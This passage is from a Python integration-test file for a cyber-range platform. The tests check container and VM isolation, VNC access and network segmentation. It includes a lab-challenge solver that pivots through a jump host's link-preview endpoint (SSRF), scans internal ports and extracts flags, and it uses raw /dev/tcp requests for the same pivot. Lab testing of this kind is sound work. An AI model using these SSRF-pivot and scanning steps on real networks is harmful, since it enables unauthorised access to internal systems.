            "gzip-offset": offset,
            "carved-flag": re.search(FLAG, carved).group(),
        }

    def pivot(run):
        run(
            "for i in $(seq 1 60); do (exec 3<>/dev/tcp/jump/80) 2>/dev/null && break; "
            "sleep 0.5; done"
        )
        assert "unreachable" in run("curl -s -m 3 http://vault/ || echo unreachable")
        home = run('curl -s "http://jump/preview?url=http://vault/"')
        found = run(
            'for p in $(seq 8000 8099); do echo -n "$p "; '
            'curl -s "http://jump/preview?url=http://vault:$p/" | head -1; done '
            "| grep -v 'could not'"
        )
        port = found.split()[0]
        admin = run(f'curl -s "http://jump/preview?url=http://vault:{port}/"')
        return {
            "internal-flag": re.search(FLAG, home).group(),
            "admin-port": port,
            "admin-flag": re.search(FLAG, admin).group(),
        }

    _solve(client, "pivot-ssrf", pivot)
    _solve(client, "web-logins", logins)
    _solve(client, "recon-chain", chain)
    _solve(client, "file-forensics", forensics)


ISOLATION_LEVELS = [
    lvl for lvl in os.environ.get("CYBERLAB_ISOLATION_TESTS", "").split(",") if lvl.strip()
]


@pytest.mark.skipif(not ISOLATION_LEVELS, reason="set CYBERLAB_ISOLATION_TESTS=sandbox,microvm")
@pytest.mark.parametrize("level", ISOLATION_LEVELS or ["none"])
def test_stronger_isolation_on_real_runtimes(client, level):
    """The machine really runs on its own kernel, still hardened, and still usable: files,
    a terminal-style command, and lab files placed by the lab engine."""
    import platform

    st = client.get("/v1/system/execution", headers=auth()).json()
    assert level in st["isolation"], st
    manifest = f"""apiVersion: cyberlab.dev/v1alpha1
kind: Universe
metadata: {{name: it-{level}}}
spec:
  environments:
    - name: box
      baseImage: ubuntu-24-04
      resources: {{cpu: 1, memoryMiB: 1024, storageGiB: 2}}
      network: {{mode: isolated}}
      isolation: {level}
"""
    ws, (env,) = provision(client, manifest, f"it-{level}")
    name = env["resources"]["container"]
    try:
        code, kernel = sh(name, "uname -r")
        assert code == 0 and kernel and kernel != platform.release(), (kernel, platform.release())
        runtime = docker("inspect", "--format", "{{.HostConfig.Runtime}}", name).stdout
        assert runtime.strip() in ("runsc", "kata"), runtime
        code, who = sh(name, "id -u")
        assert who == "1000"
        ro = docker("inspect", "--format", "{{.HostConfig.ReadonlyRootfs}}", name).stdout
        assert ro.strip() == "true"
        code, out = sh(name, "echo hi > /workspace/f && cat /workspace/f")
        assert out == "hi", out
        r = client.get(
            f"/v1/workspaces/{ws}/environments/{env['id']}/files?path=.", headers=auth()
        ).json()
        assert "f" in [e["name"] for e in r["entries"]]
        if level == "sandbox":
            code, msg = sh(name, "dmesg 2>/dev/null | head -3 || true")
            assert "gvisor" in msg.lower() or code != 0
    finally:
        destroy_all(client, ws, [env])


@pytest.mark.skipif(
    os.environ.get("CYBERLAB_VM_TESTS") != "1", reason="set CYBERLAB_VM_TESTS=1 (needs KVM)"
)
def test_full_vm_boots_an_iso_from_a_link(client):
    """The whole path: approval, a VM machine, boot media downloaded by the server from the
    official Alpine site (checksum verified), QEMU/KVM booting it, and its screen over the
    remote desktop's VNC channel."""
    import json as _json
    import time as _time

    import httpx
    import yaml

    base = "https://dl-cdn.alpinelinux.org/alpine/latest-stable/releases/x86_64/"
    releases = yaml.safe_load(httpx.get(base + "latest-releases.yaml", timeout=30).text)
    iso = next(r for r in releases if r["flavor"] == "alpine-virt" and r["file"].endswith(".iso"))
    manifest = """apiVersion: cyberlab.dev/v1alpha1
kind: Universe
metadata: {name: it-vm}
spec:
  environments:
    - name: pc
      baseImage: vm-host
      resources: {cpu: 1, memoryMiB: 1536, storageGiB: 8}
      network: {mode: isolated}
      access: {desktop: true}
      vm: {boot: boot.iso, diskGiB: 2}
"""
    ws = client.post("/v1/workspaces", json={"name": "it-vm"}, headers=auth()).json()["id"]
    r = client.put(f"/v1/workspaces/{ws}/manifest", content=manifest, headers=YAML | auth())
    assert r.status_code in (200, 201), r.text
    r = client.post(
        f"/v1/workspaces/{ws}/approvals",
        json={"revision": 1, "approve": ["security.full-vm"]},
        headers=auth(),
    )
    assert r.status_code == 201, r.text
    r = client.post(f"/v1/workspaces/{ws}/environments", json={}, headers=auth())
    assert r.status_code == 201, r.text
    (env,) = r.json()["environments"]
    try:
        assert env["state"] == "running", env
        name = env["resources"]["container"]
        media = f"/v1/workspaces/{ws}/environments/{env['id']}/vm/media"
        r = client.post(
            media, json={"url": base + iso["file"], "sha256": iso["sha256"]}, headers=auth()
        )
        assert r.status_code == 202, r.text
        for _ in range(300):
            st = client.get(media, headers=auth()).json()
            if st["state"] in ("ready", "failed"):
                break
            _time.sleep(1)
        assert st["state"] == "ready", st
        # QEMU starts once the ISO has stopped growing, with KVM, as the unprivileged user
        for _ in range(60):
            # (no ps in the image: read /proc directly)
            code, ps = sh(
                name,
                "for p in /proc/[0-9]*; do c=$(tr '\\0' ' ' < $p/cmdline 2>/dev/null); "
                'case "$c" in qemu-system*) '
                "echo \"$(awk '/^Uid/{print $2}' $p/status) $c\";; esac; done",
            )
            if "qemu" in ps:
                break
            _time.sleep(1)
        assert "-enable-kvm" in ps and ps.split()[0] == "1000", ps
        # the VM's screen through the desktop channel (VNC handshake with QEMU)
        r = client.post(f"/v1/workspaces/{ws}/environments/{env['id']}/desktop", headers=auth())
        assert r.status_code == 201, r.text
        with client.websocket_connect("/v1/desktop") as sock:
            sock.send_text(_json.dumps({"type": "auth", "ticket": r.json()["ticket"]}))
            assert _json.loads(sock.receive_text())["type"] == "ready"
            buf = b""

            def need(n):
                nonlocal buf
                while len(buf) < n:
                    buf += sock.receive_bytes()
                out, buf = buf[:n], buf[n:]
                return out

            assert need(12).startswith(b"RFB 003.00")
            sock.send_bytes(b"RFB 003.008\n")
            count = need(1)[0]
            assert 1 in need(count)
            sock.send_bytes(bytes([1]))
            assert need(4) == b"\0\0\0\0"
            sock.send_bytes(bytes([1]))
            width, height = int.from_bytes(need(2), "big"), int.from_bytes(need(2), "big")
            assert width >= 320 and height >= 200, (width, height)
        code, files = sh(name, "ls -la /workspace")
        assert "disk.qcow2" in files and "boot.iso" in files, files
    finally:
        destroy_all(client, ws, [env])


SEGMENTED = """apiVersion: cyberlab.dev/v1alpha1
kind: Universe
metadata: {name: it-pivot}
spec:
  environments:
    - name: attacker
      baseImage: ubuntu-24-04
      resources: {cpu: 0.5, memoryMiB: 512, storageGiB: 2}
      network: {mode: lab, segments: [dmz]}
    - name: jump
      role: target
      baseImage: lab-target
      resources: {cpu: 0.25, memoryMiB: 128, storageGiB: 1}
      network: {mode: lab, segments: [dmz, internal]}
      access: {terminal: false}
    - name: vault
      role: target
      baseImage: lab-target
      resources: {cpu: 0.25, memoryMiB: 128, storageGiB: 1}
      network: {mode: lab, segments: [internal]}
      access: {terminal: false}
"""


def test_network_segments_isolate_and_a_pivot_bridges_them(client):
    """The attacker can't reach vault (other segment, not even its name), but can through
    jump's link preview, which sits on both segments."""
    import json as _json

    ws, envs = provision(client, SEGMENTED, "it-pivot")
    by = {e["name"]: e["resources"]["container"] for e in envs}
    try:
        fetchers = {"/preview": {"param": "url", "allow": ["vault"]}}
        jump = {
            "services": [
                {
                    "port": 80,
                    "kind": "http",
                    "routes": {"/": {"body": "jump"}},
                    "fetchers": fetchers,
                }
            ]
        }
        vault = {
            "services": [{"port": 80, "kind": "http", "routes": {"/": {"body": "vault-secret"}}}]
        }
        for name, conf in (("jump", jump), ("vault", vault)):
            code, out = sh(
                by[name], f"echo '{_json.dumps(conf)}' > /workspace/.cyberlab-target.json"
            )
            assert code == 0, out
        get = (
            "exec 3<>/dev/tcp/{host}/80 && printf 'GET {path} HTTP/1.0\\r\\n\\r\\n' >&3 "
            "&& timeout 5 cat <&3"
        )
        wait = (
            "for i in $(seq 1 40); do (exec 3<>/dev/tcp/jump/80) 2>/dev/null && break; "
            "sleep 0.5; done"
        )
        sh(by["attacker"], wait, interpreter="bash")
        code, direct = sh(by["attacker"], get.format(host="vault", path="/"), interpreter="bash")
        assert code != 0 and "vault-secret" not in direct, direct
        for _ in range(20):
            code, via = sh(
                by["attacker"],
                get.format(host="jump", path="/preview?url=http://vault/"),
                interpreter="bash",
            )
            if "vault-secret" in via:
                break
            time.sleep(0.5)
        assert "vault-secret" in via, via
    finally:
        destroy_all(client, ws, envs)
    left = docker("network", "ls", "--format", "{{.Name}}").stdout
    assert "-lab-dmz" not in left and "-lab-internal" not in left, left
